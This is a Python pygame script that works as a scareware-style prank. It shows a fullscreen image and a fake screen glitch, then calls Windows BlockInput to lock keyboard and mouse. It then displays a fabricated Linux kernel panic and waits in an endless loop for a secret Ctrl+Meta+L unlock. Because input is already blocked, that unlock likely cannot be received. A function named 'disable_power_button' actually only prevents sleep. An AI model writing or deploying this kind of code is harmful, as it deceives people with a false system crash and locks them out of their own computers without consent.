import pygame
import subprocess
import time
import random
import os
import ctypes
import sys

def disable_keyboard():
    if sys.platform.startswith('win'):
        ctypes.windll.user32.BlockInput(True)

def enable_keyboard():
    if sys.platform.startswith('win'):
        ctypes.windll.user32.BlockInput(False)

def disable_power_button():
    if sys.platform.startswith('win'):
        ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)

def display_fullscreen_image():
    pygame.init()
    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    image = pygame.image.load("screen.png")
    screen.blit(image, (0, 0))
    pygame.display.flip()
    
    pygame.mouse.set_visible(False)
    
    running = True
    while running:
        for event in pygame.event.get():
            if event.type in (pygame.MOUSEBUTTONDOWN, pygame.KEYDOWN):
                running = False
                break
        pygame.event.pump()
    
    pygame.time.wait(3000)
    glitch_effect(screen)
    disable_keyboard()
    disable_power_button()
    simulate_kernel_panic(screen)

def glitch_effect(screen):
    screen_width, screen_height = screen.get_size()
    for _ in range(50):
        x = random.randint(0, screen_width - 50)
        y = random.randint(0, screen_height - 50)
        width = random.randint(10, 100)
        height = random.randint(10, 100)
        pygame.draw.rect(screen, (0, 0, 0), (x, y, width, height))
    pygame.display.flip()
    pygame.time.wait(1000)
    
    screen_area = screen_width * screen_height
    glitch_area = int(screen_area * 0.7)
    num_glitches = glitch_area // 150
    
    for _ in range(num_glitches):
        x = random.randint(0, screen_width - 10)
        y = random.randint(0, screen_height - 10)
        width = random.randint(10, min(80, screen_width - x))
        height = random.randint(10, min(80, screen_height - y))
        pygame.draw.rect(screen, (0, 0, 0), (x, y, width, height))
    pygame.display.flip()
    pygame.time.wait(500)
    
    screen.fill((0, 0, 0))
    pygame.display.flip()

def simulate_kernel_panic(screen):
    font_path = os.path.join(os.path.dirname(__file__), 'font.ttf')
    font = pygame.font.Font(font_path, 14)
    screen_width, screen_height = screen.get_size()
    line_height = 16
    max_lines = screen_height // line_height
    
    panic_messages = [
        "[    3.496473] Kernel panic - not syncing: Fatal exception in interrupt",
        "[    3.496474] CPU: 2 PID: 0 Comm: swapper/2 Not tainted 5.15.0-76-generic #83-Ubuntu",
        "[    3.496475] Hardware name: Dell Inc. Precision 5550/0D1VJ4, BIOS 1.14.0 02/17/2023",
        "[    3.496476] RIP: 0010:__switch_to+0x8e/0x1c0",
        "[    3.496477] Code: 48 8b 45 d0 48 8b 75 c8 48 89 e5 48 8b 7d c0 48 8b 5d b8 <0f> 01 f8 48 89 45 d0 48 89 75 c8 48 89 7d c0 48 89 5d b8 48 8b",
        "[    3.496478] RSP: 0018:ffffb8c280403e78 EFLAGS: 00000246 ORIG_RAX: ffffffffffffffff",
        "[    3.496479] RAX: 0000000000000000 RBX: ffff9d8f80000000 RCX: 0000000000000000",
        "[    3.496480] RDX: 0000000000000000 RSI: ffff9d8f80000000 RDI: ffff9d8f80000000",
        "[    3.496481] RBP: ffffb8c280403e78 R08: 0000000000000000 R09: 0000000000000000",
        "[    3.496482] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000",
        "[    3.496483] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000",
        "[    3.496484] FS:  0000000000000000(0000) GS:ffff9d8f80000000(0000) knlGS:0000000000000000",
        "[    3.496485] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033",
        "[    3.496486] CR2: 00007f7f9c000000 CR3: 000000010a40a000 CR4: 00000000003606e0",
        "[    3.496487] Call Trace:",
        "[    3.496488]  ? schedule+0x2c/0x70",
        "[    3.496489]  ? schedule_preempt_disabled+0x13/0x20",
        "[    3.496490]  ? __mutex_lock_slowpath+0x115/0x1a0",
        "[    3.496491]  ? mutex_lock+0x2f/0x40",
        "[    3.496492]  ? kernfs_get+0x2d/0x60",
        "[    3.496493]  ? sysfs_get+0x9/0x10",
        "[    3.496494]  ? sysfs_find_dirent+0x33/0x50",
        "[    3.496495]  ? sysfs_add_one+0x57/0xb0",
        "[    3.496496]  ? sysfs_create_dir_ns+0x78/0xf0",
        "[    3.496497]  ? kobject_add_internal+0x15c/0x2d0",
        "[    3.496498]  ? kobject_init_and_add+0x72/0xc0",
        "[    3.496499]  ? device_add+0x369/0x730",
        "[    3.496500]  ? platform_device_add+0x11c/0x250",
        "[    3.496501]  ? platform_device_register_full+0x11b/0x160",
        "[    3.496502]  ? __platform_driver_register+0x59/0x70",
        "[    3.496503]  ? subsys_initcall+0x5/0x7a",
        "[    3.496504]  ? do_one_initcall+0x54/0x1f0",
        "[    3.496505]  ? kernel_init_freeable+0x1f6/0x2d3",
        "[    3.496506]  ? kernel_init+0x5/0x100",
        "[    3.496507]  ? ret_from_fork+0x35/0x40",
        "[    3.496508] Kernel Offset: 0x1a00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)",
        "[    3.496509] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---"
    ]
    
    surface = pygame.Surface(screen.get_size())
    surface.fill((0, 0, 0))
    
    for i, message in enumerate(panic_messages):
        text = font.render(message, True, (255, 255, 255))
        surface.blit(text, (10, i * line_height))
        if i >= max_lines - 1:
            break
    
    screen.blit(surface, (0, 0))
    pygame.display.flip()
    pygame.time.wait(100)
    
    while True:
        for event in pygame.event.get():
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_l and pygame.key.get_mods() & pygame.KMOD_LCTRL and pygame.key.get_mods() & pygame.KMOD_LMETA:
                    enable_keyboard()
                    pygame.quit()
                    return
        pygame.event.pump()

if __name__ == "__main__":
    display_fullscreen_image()
